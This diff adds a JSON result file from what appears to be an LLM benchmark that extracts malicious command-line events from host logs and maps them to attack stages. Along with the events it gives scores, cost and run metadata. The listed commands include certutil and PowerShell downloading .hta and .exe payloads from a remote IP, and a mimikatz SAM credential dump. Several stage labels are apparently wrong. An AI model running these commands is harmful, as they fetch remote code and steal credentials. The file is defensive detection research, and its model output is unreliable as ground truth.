@@ -1,0 +1,142 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "msedge.exe --no-startup-window /prefetch:5",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "HxOutlook.exe -ServerName:microsoft.windowslive.mail.AppXfbjsbkxvprcgqg6q4c9jfr0pn3kv9x5s.mca",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "CertUtil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\"Invoke-WebRequest http://124.223.85.207:8082/Test.hta...'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C powerspolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {if (Test-Path $env:TEMP\\T1059.003_script.bat) {exit 0} else {exit 1}} ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\ WINDOWS \\ System32 \\ cmd . exe / c \\",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ WINDOWS \\ System32 \\ cmd . exe / c \\",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /C \"rundll32 user32.dll,LockWorkStation\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"mimikatz2.exe  lsadump::sam exit\"",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attacker begins with multiple initial accesses through various methods, creating a foothold on the compromised host. They utilize command-and-control channels, executing various scripts for discovery purposes. With persistence established, the attackers continue to escalate privileges, accessing sensitive information stored locally, and evading detection mechanisms.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121729,
+      "completion_tokens": 10190,
+      "total_tokens": 131919,
+      "wall_clock_s": 142.762,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.34782608695652173,
+      "recall": 0.4444444444444444,
+      "f1": 0.3902439024390244,
+      "tp": 8,
+      "fp": 15,
+      "fn": 10
+    },
+    "stage": {
+      "precision": 0.21739130434782608,
+      "recall": 0.3125,
+      "f1": 0.2564102564102564,
+      "tp": 5,
+      "fp": 18,
+      "fn": 11,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.2,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121729,
+      "completion_tokens": 10190,
+      "total_tokens": 131919,
+      "wall_clock_s": 142.762,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
